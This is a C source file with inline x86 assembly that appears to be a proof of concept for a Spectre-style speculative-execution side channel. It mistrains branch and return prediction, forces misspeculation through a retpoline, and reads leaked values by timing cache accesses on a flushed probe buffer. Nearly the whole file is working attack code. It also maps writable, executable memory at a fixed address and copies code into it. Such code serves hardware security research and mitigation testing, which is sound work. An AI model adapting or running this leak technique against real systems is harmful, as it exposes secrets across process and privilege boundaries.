#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include "common.h"

// Defines the bandwidth we can communicate
// from speculative -> von neuman
// e.g. 256 would be 1 byte of info
// Tradeoff here is larger bandwidth means we have
// to check more places in probe_buf (and flush them)
#define NUM_PROBES 1024
#define DECRYPT_LEN 256

#define MAX_ITERATIONS 2000
// These define the stride length we take between probes
// This thwarts a clever CPU's stride prediction
// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
// Generally, this results in not seeing ANY winning probes
// in which case, we change cur_probe_space and retry
#define MAX_PROBE_SPACE (1000003)
uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;


// The (heap-allocated) probe buffer
// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
// in the cache to communicate the value i from speculative -> von neuman
uint8_t __attribute__((section(".probe_buf"))) *probe_buf;


// This is a simple counter, accessed by the speculative function (target_fn)
// so it can compute on it.
uint16_t signal_idx = 0;


// Stats
uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
uint64_t tot_time = 0;      // Number cycles total

unsigned int junk=0;    // For rdtscp


void *map;
#define TARGET_FN_ADDR 0x414100401000

// We define this function in assembly (target_fn.S)
// It is never called directly (essentially dead code)
// However, indirect.c trains the processor to think the indirect
// jump in common.c::indirect() is going to call this function
// We flush the fn_ptr used by indirect(), forcing the CPU to
// (mis)speculate and start processing this function.
// In reality, the CPU will (eventually) call check_probes()
// where we collect results and see what's in cache
void target_fn(void) __attribute__((section(".targetfn")));
void end_target_fn(void);

uint64_t results[NUM_PROBES];

void check_probes() {
    uint64_t t0, t1;
    uint8_t *addr;

    int i;
    for (i=0; i<NUM_PROBES; i++) {
        addr = &probe_buf[i*cur_probe_space];
        t0 = _rdtscp(&junk);
        asm volatile( "movb (%%rbx), %%al\n"
            :: "b"(addr) : "rax");
        t1 = _rdtscp(&junk);
        if (t1-t0 < 140) {
            cache_hits++;
            tot_time += t1-t0;
            results[i]++;
        }
    }
    tot_runs++;

    // Clear probe_buf from cache
    for (i=0; i<NUM_PROBES; i++) {
        _mm_clflush(&probe_buf[i*cur_probe_space]);
    }
}

uint64_t jmp_ptr;


// Find the K items in results that have been hit the most often
bool get_top_k(uint64_t k, uint64_t* output_i, uint64_t* output_res){

    uint64_t top_k[k];
    uint64_t top_k_res[k];
    uint64_t min_i=0;
    uint64_t min_hits_allowed=1;
    uint64_t hits=0;

    uint64_t i, j, x;

    for ( i=0; i<k; i++){
        top_k[i]=0;
        top_k_res[i]=0;
    }

    // printf("results[0x11] = %ld\n", results[0x11]);
    for (i=0; i<NUM_PROBES; i++) {

        if (results[i] < min_hits_allowed){
            continue;
        }
        else hits++;
        // if the result is greater than the current minimum in the Top-K replace it
        if (results[i] > top_k_res[min_i]){
            top_k_res[min_i] = results[i];
            top_k[min_i] = i;

            // Find the new minimum in the Top-K
            for (j=0; j<k; j++){
                if (top_k_res[j] < top_k_res[min_i]){
                    min_i = j;
                }
            }
        }
    }

    if (hits >= k){
        for (i=0; i<k; i++){
            output_i[i] = top_k[i];
            output_res[i] = top_k_res[i];
            printf("\t[%04lX]  %ld -- %ld / %d\n",  output_i[i], i, output_res[i],MAX_ITERATIONS); 
        }
        return true;
    } else {
        return false;
    }
}

// Signal32 will use a bitmask on the upper part of each item in the 
// Top-K items to identify where it goes in the final result. This 
// reconstructs that result by identifying the bitmasks.
uint64_t construct_result(uint64_t k, uint64_t width, uint64_t* top_k){
    uint64_t i, j, bm;
    uint64_t final_result=0;

    // check each index bitmask up to k
    for (i = 0; i < k; i++){

        // printf("%ld - %03lX\n", i, top_k[i]); 
        // check each result to see if it matches this bitmask
        for (j=0; j < k; j++){

            if (top_k[j]>>width == i){
                // clear the bitmask and BITWISE-OR this block into the correct slot in the final result
                final_result |= ( top_k[j] ^ (i<<width) ) << (i*width);
                break;
            }           
        }
    }
    return final_result;
}


void flush_RSB() {
    asm volatile(
        ".rept 32\n"
        "call 1f\n"
        "pause\n"
        "lfence\n"
        "1: \n"
        ".endr\n"
        "callq .+0x26\n"//
        "movq $0x88, %%rcx\n"
        "mov (cur_probe_space), %%rax\n"
        "imul %%rcx\n"
        "mov (probe_buf), %%rdx\n"
        "add %%rax, %%rdx\n"
        "mov (%%rdx), %%rax\n"
        "nop\n"
        "addq $(8 * 33),%%rsp\n"
    :::);
}


void retpoline_r11(){
    asm volatile(
        "movq (fn_ptr), %%r11\n"
        "jmp set_up_return\n"
    "inner_indirect_branch:\n"
        "call set_up_target\n"
    "capture_spec:\n"
        "pause\n"
//         // Signal(0x11)
//         "movq $0x11, %%rcx\n"
//         "mov (cur_probe_space), %%rax\n"
//         "imul %%rcx\n"
//         "mov (probe_buf), %%rdx\n"
//         "add %%rax, %%rdx\n"
//         "mov (%%rdx), %%rax\n"
//         "nop\n"
        "jmp capture_spec\n"
    "set_up_target:\n"
        "mov %%r11, (%%rsp)\n"
        "ret\n"
    "set_up_return:\n"
        "call inner_indirect_branch\n"
    :::);
}


void rt1(){
    asm volatile(
        // Signal(0xFF)
        "movq $0xFF, %%rcx\n"
        "mov (cur_probe_space), %%rax\n"
        "imul %%rcx\n"
        "mov (probe_buf), %%rdx\n"
        "add %%rax, %%rdx\n"
        "mov (%%rdx), %%rax\n"
        "nop\n"
    :::);
}

void measure() {
    //jmp_ptr = 0x400e60;
    jmp_ptr = 0;
    int i, j;

    int misses = 0;
    uint64_t k = 2;
    uint64_t width = 8;
    uint64_t top_k_i[k]; 
    uint64_t top_k_res[k]; 
    uint64_t final_i;
    bool hit_miss=0;

    while (1) {
        for (i=0; i<MAX_ITERATIONS; i++) {

            fn_ptr = rt1;
                
            for (j=0; j<100; j++){
                retpoline_r11();
                _mm_clflush(&fn_ptr);

            }
            fn_ptr = check_probes;
            _mm_clflush(&fn_ptr);
            // Clear probe_buf from cache
            // for (j=0; j<NUM_PROBES; j++) {
            //     _mm_clflush(&probe_buf[j*cur_probe_space]);
            // }
            flush_RSB(); 
            retpoline_r11();

            //((void(*)(void *))map)(&jmp_ptr);
            usleep(1);
        }
        uint64_t avg = 0;
        if (cache_hits > 0) avg = tot_time/cache_hits;
        
        // the results array is global
        hit_miss = get_top_k(k, top_k_i, top_k_res);

        if (hit_miss){
            final_i = construct_result(k, width, top_k_i); 
            printf("[%08lX]\n\n", final_i);

            signal_idx++;
            misses = 0;
            if (signal_idx > DECRYPT_LEN) {
                exit(0);
            }

        } else {
            printf("--[]: %lu avg cycles ps %ld\n", avg, cur_probe_space);
            misses++;
            cur_probe_space += 63;
            cur_probe_space %= MAX_PROBE_SPACE;
        }
        cache_hits = 0;
        tot_runs = 0;
        tot_time = 0;

        memset(results, 0, sizeof(uint64_t)*NUM_PROBES);
        //signal_idx %= NUM_PROBES;
        usleep(10);
    }

}



int main()
{
    probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
    if (probe_buf == NULL) {
        perror("malloc");
        return -1;
    }

    printf("probe_buf @%p\n", probe_buf);
    int i =0;
    for (i=0; i<NUM_PROBES; i++) {
        memset(&probe_buf[i*MAX_PROBE_SPACE], i, MAX_PROBE_SPACE);
        _mm_clflush(&probe_buf[i*cur_probe_space]);
    }

    map = mmap((void*)TARGET_FN_ADDR, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    memcpy(map, indirect, ((uint64_t)end_indirect)-((uint64_t)indirect));
    memcpy(map+600, target_fn, end_target_fn-target_fn);

    fn_ptr = check_probes;
    measure();

}
